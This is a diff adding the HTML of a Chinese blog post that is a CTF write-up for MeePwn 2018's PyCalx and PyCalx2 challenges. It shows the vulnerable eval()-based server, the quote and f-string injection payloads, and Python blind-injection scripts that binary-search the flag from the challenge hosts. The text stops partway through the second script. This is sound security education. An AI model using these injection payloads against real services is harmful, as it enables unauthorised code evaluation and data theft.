@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"findneo.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="本文首发 先知社区 ，转载请注明链接。  PyCalx This code is supposed to be unexploitable :&#x2F; another pyjail?[Source]Try this or thisNotice: The flag may contain non alphabetic characters (but still printable)  本题由Python的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Meepwn2018：PyCalx&amp;PyCalx2——Python3的f-string与eval注入">
+<meta property="og:url" content="https://findneo.github.io/180719MeePwn_py3Inject/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="本文首发 先知社区 ，转载请注明链接。  PyCalx This code is supposed to be unexploitable :&#x2F; another pyjail?[Source]Try this or thisNotice: The flag may contain non alphabetic characters (but still printable)  本题由Python的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://findneo.github.io/180719MeePwn_py3Inject/1531905259492.png">
+<meta property="og:image" content="https://findneo.github.io/180719MeePwn_py3Inject/1531905207979.png">
+<meta property="article:published_time" content="2018-07-19T01:10:50.000Z">
+<meta property="article:modified_time" content="2021-03-09T13:32:32.000Z">
+<meta property="article:author" content="findneo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://findneo.github.io/180719MeePwn_py3Inject/1531905259492.png">
+
+<link rel="canonical" href="https://findneo.github.io/180719MeePwn_py3Inject/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Meepwn2018：PyCalx&PyCalx2——Python3的f-string与eval注入 | 闲言语</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">闲言语</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/180719MeePwn_py3Inject/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/findneo.png">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Meepwn2018：PyCalx&PyCalx2——Python3的f-string与eval注入
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2018-07-19 09:10:50" itemprop="dateCreated datePublished" datetime="2018-07-19T09:10:50+08:00">2018-07-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-09 21:32:32" itemprop="dateModified" datetime="2021-03-09T21:32:32+08:00">2021-03-09</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><strong>本文首发 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2446">先知社区</a> ，转载请注明链接。</strong> </p>
+<h1 id="PyCalx"><a href="#PyCalx" class="headerlink" title="PyCalx"></a>PyCalx</h1><blockquote>
+<p>This code is supposed to be unexploitable :/ another pyjail?<br>[<a target="_blank" rel="noopener" href="http://178.128.96.203/cgi-bin/server.py?source=1">Source]</a><br><a target="_blank" rel="noopener" href="http://178.128.96.203/cgi-bin/server.py?value1=123&op===&value2=123">Try this </a>or <a target="_blank" rel="noopener" href="http://178.128.96.203/cgi-bin/server.py?value1=abc&op===&value2=abc">this</a><br>Notice: The flag may contain non alphabetic characters (but still printable)</p>
+</blockquote>
+<p>本题由Python的 <code>eval()</code> 函数参数可控且直接拼接引发的注入，采用二分法盲注。</p>
+<p>server.py源码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;/var/www/flag&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">OK_200 = <span class="string">&quot;some HTML code&quot;</span></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;source&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">&#x27;source&#x27;</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> + escape(<span class="built_in">str</span>(<span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>).read())) + <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;value1&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;value2&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;op&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(val).isdigit(): <span class="keyword">return</span> <span class="built_in">int</span>(val)</span><br><span class="line">        blacklist = [<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>,</span><br><span class="line">                     <span class="string">&#x27;&quot;&#x27;</span>]  <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span>(<span class="params">val</span>):</span></span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">&#x27;op&#x27;</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">&#x27;value1&#x27;</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">&#x27;value2&#x27;</span>].value)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(value1).isdigit() ^ <span class="built_in">str</span>(value2).isdigit():</span><br><span class="line">        print(<span class="string">&#x27;&lt;center&gt;Types of the values don\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    calc_eval = <span class="built_in">str</span>(<span class="built_in">repr</span>(value1)) + <span class="built_in">str</span>(op) + <span class="built_in">str</span>(<span class="built_in">repr</span>(value2))</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span> + escape(calc_eval) + <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">str</span>(<span class="built_in">eval</span>(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(</span><br><span class="line">                <span class="string">&quot;Invalid&quot;</span></span><br><span class="line">            )  <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;Invalid&quot;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>大意如下：</p>
+<ul>
+<li>cgi会处理source，value1，value2，op四个参数。</li>
+<li>如果source=1则打印源代码。</li>
+<li>value1，value2，op三个参数都有值时进一步处理。<ul>
+<li>value1，value2至少1个字符，至多64个，且不包含黑名单<code>()[]&#39;&quot;</code> 里的字符。</li>
+<li>op至少1个字符，至多2个，且首字符必须在白名单<code>+-*/=!</code> 里。</li>
+<li>value1,value2要么都是只包含<code>[0-9]</code>，要么都包含其他字符。</li>
+<li>执行<code>str(eval(str(repr(value1)) + str(op) + str(repr(value2))))</code> ，且只有结果是bool值或只包含<code>[0-9]</code> 时才会输出。<ul>
+<li>注：repr返回对象的可打印形式，和反引号包裹效果一致，对大多数类型，他会返有一个字符串，使其可以作为代码直接传入eval执行。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>解题思路：<code>op</code> 允许两个字符，且第二个字符是任意的，那么如果是一个单引号，就能混淆代码和数据，起到类似SQL注入的效果。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&quot;a&quot;</span>))+<span class="built_in">str</span>(<span class="string">&quot;+&quot;</span>)+<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&quot;b&quot;</span>)))</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;b&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&quot;a&quot;</span>))+<span class="built_in">str</span>(<span class="string">&quot;+&#x27;&quot;</span>)+<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&quot;&lt; b#&quot;</span>)))</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;&#x27;</span>&lt; b<span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">v1, v2, op, s</span>):</span></span><br><span class="line">    u = <span class="string">&quot;http://178.128.96.203/cgi-bin/server.py?&quot;</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    <span class="comment"># print payload</span></span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    <span class="comment"># print r.url</span></span><br><span class="line">    res = re.findall(<span class="string">&quot;&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;&quot;</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> (res != <span class="string">&#x27;Invalid&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">&#x27;True&#x27;</span></span><br><span class="line">    <span class="comment"># print r.content</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">mid</span>):</span></span><br><span class="line">    s = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span>(<span class="params">seq=xrange(<span class="params"><span class="number">0x20</span>, <span class="number">0x80</span></span>), lo=<span class="number">0</span>, hi=<span class="literal">None</span></span>):</span></span><br><span class="line">    <span class="keyword">assert</span> (lo &gt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> hi == <span class="literal">None</span>: hi = <span class="built_in">len</span>(seq)</span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        <span class="comment"># print lo, mid, hi, &quot;\t&quot;,</span></span><br><span class="line">        <span class="keyword">if</span> check(seq[mid]): hi = mid</span><br><span class="line">        <span class="keyword">else</span>: lo = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> seq[lo]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">v1, v2, op, s = <span class="string">&#x27;x&#x27;</span>, <span class="string">&quot;+FLAG&lt;value1+source#&quot;</span>, <span class="string">&quot;+&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(bin_search() - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span> flag</span><br><span class="line"><span class="comment"># MeePwnCTF&#123;python3.66666666666666_([_((you_passed_this?]]]]]])&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="1531905259492.png" alt="1531905259492"></p>
+<h1 id="PyCalx2"><a href="#PyCalx2" class="headerlink" title="PyCalx2"></a>PyCalx2</h1><blockquote>
+<p>You should solve <code>PyCalx</code> first. </p>
+<p><a target="_blank" rel="noopener" href="http://206.189.223.3/cgi-bin/server.py?source=1">http://206.189.223.3/cgi-bin/server.py?source=1</a>  </p>
+</blockquote>
+<p><code>server.py</code> 只改动了一行代码，将<code>    op = get_op(arguments[&#39;op&#39;].value)</code> 变成了 <code>op = get_op(get_value(arguments[&#39;op&#39;].value))</code>  ，也就是说将<code>op</code> 参数也进行了黑名单过滤，于是 <code>op</code> 的第二个字符就不能是单引号，第一题的方法也就失效了。</p>
+<p>结合题目提示和第一题的flag去寻找Python3.6的新特性，用到了这个 <code> f-string  </code> ，详见<a target="_blank" rel="noopener" href="https://www.python.org/dev/peps/pep-0498/">PEP 498 – Literal String Interpolation</a> 。简言之就是可以在字符串中方便地直接插入表达式，以<code>f</code> 开头，表达式插在大括号<code>&#123;&#125;</code> 里，在运行时表达式会被计算并替换成对应的值。</p>
+<p>本题主要是利用这个特性在字符串里插入比较的表达式，剩下的就和上题一样了。插法不尽相同，CTF Time上的WP里有这么两种，相信还可以有其他的方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;T&#x27;</span>))+<span class="built_in">str</span>(<span class="string">&#x27;+f&#x27;</span>)+<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;ru&#123;FLAG&lt;source or 14:x&#125;&#x27;</span>)) <span class="comment"># 14的十六进制表示时&#x27;e&#x27;</span></span><br><span class="line"><span class="string">&quot;&#x27;T&#x27;+f&#x27;ru&#123;FLAG&lt;source or 14:x&#125;&#x27;&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;T&#x27;</span>))+<span class="built_in">str</span>(<span class="string">&#x27;+f&#x27;</span>)+<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;ru&#123;1 or 14:x&#125;&#x27;</span>)))</span><br><span class="line"><span class="string">&#x27;Tru1&#x27;</span> <span class="comment"># 返回Invalid</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;T&#x27;</span>))+<span class="built_in">str</span>(<span class="string">&#x27;+f&#x27;</span>)+<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;ru&#123;0 or 14:x&#125;&#x27;</span>)))</span><br><span class="line"><span class="string">&#x27;True&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;Tru&#x27;</span>))+<span class="built_in">str</span>(<span class="string">&#x27;+f&#x27;</span>)+<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;&#x27;</span>))</span><br><span class="line"><span class="string">&quot;&#x27;Tru&#x27;+f&#x27;&#123;sys.exit.__name__:&#123;FLAG&lt;source:1&#125;.1&#125;&#x27;&quot;</span></span><br><span class="line"><span class="comment"># &#123;FLAG&lt;source:1&#125;的值相当于printf(&quot;%1f&quot;,FLAG&lt;source)的结果，有0和1两种可能。</span></span><br><span class="line"><span class="comment">#这边sys.exit.__name__等价于字符串&#x27;exit&#x27;，考虑到已经import escape，直接用escape.__name__也可。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;Tru&#x27;</span>))+<span class="built_in">str</span>(<span class="string">&#x27;+f&#x27;</span>)+<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;&#123;sys.exit.__name__:&#123;1:1&#125;.1&#125;&#x27;</span>)))</span><br><span class="line"><span class="string">&#x27;True&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;Tru&#x27;</span>))+<span class="built_in">str</span>(<span class="string">&#x27;+f&#x27;</span>)+<span class="built_in">str</span>(<span class="built_in">repr</span>(<span class="string">&#x27;&#123;sys.exit.__name__:&#123;0:1&#125;.1&#125;&#x27;</span>)))</span><br><span class="line"><span class="comment">#报错，返回Invalid</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ValueError: <span class="string">&#x27;=&#x27;</span> alignment <span class="keyword">not</span> allowed <span class="keyword">in</span> string <span class="built_in">format</span> specifier</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">v1, v2, op, s</span>):</span></span><br><span class="line">    u = <span class="string">&quot;http://206.189.223.3/cgi-bin/server.py?&quot;</span></span><br><span class="line">    payload = <span class="built_in">dict</span>(value1=v1, value2=v2, op=op, source=s)</span><br><span class="line">    r = requests.get(u, params=payload)</span><br><span class="line">    res = re.findall(<span class="string">&quot;&lt;pre&gt;\n&gt;&gt;&gt;&gt;([\s\S]*)\n&gt;&gt;&gt; &lt;\/pre&gt;&quot;</span>,</span><br><span class="line">                     r.content)[<span class="number">0</span>].split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> res == <span class="string">&#x27;Invalid&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">mid</span>):</span></span><br><span class="line">    s = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="keyword">return</span> calc(v1, v2, op, s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin_search</span>(<span class="params">seq=xrange(<span class="params"><span class="number">0x20</span>, <span class="number">0x80</span></span>), lo=<span 